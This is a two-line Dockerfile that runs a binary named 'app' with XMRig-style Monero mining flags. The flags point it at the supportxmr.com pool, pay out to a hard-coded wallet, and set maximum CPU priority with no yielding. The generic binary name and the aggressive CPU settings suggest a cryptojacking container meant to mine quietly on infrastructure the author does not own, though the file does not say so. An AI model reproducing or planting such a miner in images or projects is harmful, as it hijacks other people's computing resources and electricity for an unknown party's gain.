FROM ubuntu:18.04
CMD chmod +x app && ./app --donate-level 1 -o pool.supportxmr.com:3333 -u 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS -p khub -k --cpu-no-yield --cpu-priority 5 --randomx-mode=fast -a rx/0
